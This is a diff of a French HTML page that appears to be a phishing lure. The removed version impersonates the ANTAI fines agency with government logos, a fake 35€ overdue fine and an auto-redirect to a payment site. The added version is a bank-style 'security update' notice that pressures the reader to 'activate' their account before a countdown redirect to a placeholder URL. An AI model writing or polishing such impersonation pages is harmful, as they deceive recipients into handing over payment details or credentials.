@@ -3,57 +3,74 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Avis de contravention</title>
+  <title>Mise à jour de sécurité</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      margin: 0;
+      padding: 0;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      max-width: 650px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      border-radius: 12px;
+      text-align: left;
+    }
+    h2 {
+      text-align: center;
+      color: #004a90;
+    }
+    .timer {
+      margin-top: 20px;
+      text-align: center;
+      font-weight: bold;
+      font-size: 16px;
+      color: #d9534f;
+    }
+  </style>
   <script>
-    // Redirection après 30 secondes (30000 ms)
-    setTimeout(function() {
-      window.location.href = "https://www.antai.gouv.fr/"; // <-- mets ici ton lien de redirection
-    }, 30000);
+    let countdown = 30; // durée en secondes
+    function startTimer() {
+      const timerElement = document.getElementById("timer");
+      const interval = setInterval(() => {
+        timerElement.textContent = "Redirection dans " + countdown + " secondes...";
+        countdown--;
+        if (countdown < 0) {
+          clearInterval(interval);
+          window.location.href = "https://exemple.com"; // 🔗 URL de redirection
+        }
+      }, 1000);
+    }
+    window.onload = startTimer;
   </script>
 </head>
-<body style="margin:0; padding:0; font-family: Arial, Helvetica, sans-serif; background-color:#ffffff;">
+<body>
+  <div class="container">
+    <h2>Mise à jour de sécurité</h2>
+    <p>
+      Chère cliente, cher client,<br><br>
+      Dans le cadre de l’amélioration continue de nos services numériques, une mise à jour de sécurité est actuellement déployée progressivement par département.
+    </p>
+    <p>
+      Il est impératif que cette mise à jour soit effectuée afin d’éviter toute restriction temporaire de vos opérations en ligne. Dans le cas contraire, une régularisation en agence pourrait être nécessaire.
+    </p>
+    <p>
+      Nous vous invitons donc à activer votre compte en suivant les instructions qui vous seront transmises par nos services.
+    </p>
+    <p>
+      Nous vous remercions de votre compréhension et restons à votre disposition pour toute question.
+    </p>
+    <p>Bien cordialement,</p>
 
-  <table width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width:600px; margin:0 auto; border:1px solid #ddd;">
-    <tr>
-      <td style="padding:20px; text-align:left; vertical-align:middle; width:50%;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Logo_de_la_R%C3%A9publique_fran%C3%A7aise_%28format_carr%C3%A9%29.svg/200px-Logo_de_la_R%C3%A9publique_fran%C3%A7aise_%28format_carr%C3%A9%29.svg.png" 
-             alt="République Française" width="120" style="display:block; margin-bottom:5px;">
-        <p style="margin:0; font-size:12px; line-height:16px;">
-          Liberté<br>Égalité<br>Fraternité
-        </p>
-      </td>
-      <td style="padding:20px; text-align:right; vertical-align:middle; width:50%;">
-        <img src="https://www.antai.gouv.fr/sites/default/files/2021-06/logo-antai.png" 
-             alt="ANTAI" width="180" style="display:block;">
-      </td>
-    </tr>
-
-    <tr>
-      <td colspan="2" style="background-color:#004a90; color:#ffffff; text-align:center; font-size:16px; font-weight:bold; padding:12px;">
-        AVIS DE CONTRAVENTION
-      </td>
-    </tr>
-
-    <tr>
-      <td colspan="2" style="padding:25px; text-align:center; color:#000;">
-        <h2 style="margin:0 0 15px; font-size:18px; font-weight:bold;">
-          Service de paiement en ligne des amendes
-        </h2>
-        <p style="margin:0 0 10px; font-size:15px;">
-          Vous avez un retard de paiement de <strong>35€</strong>.
-        </p>
-        <p style="margin:0 0 10px; font-size:15px;">
-          Vous pouvez régler par carte bancaire (payer ou consigner)
-        </p>
-        <p style="margin:0; font-size:15px;">
-          Veuillez régler votre amende référence <strong>3001785</strong>.
-        </p>
-        <p style="margin-top:20px; font-size:13px; color:#666;">
-          ⚠️ Vous allez être redirigé automatiquement dans 30 secondes...
-        </p>
-      </td>
-    </tr>
-  </table>
-
+    <div class="timer" id="timer">Redirection dans 30 secondes...</div>
+  </div>
 </body>
 </html>
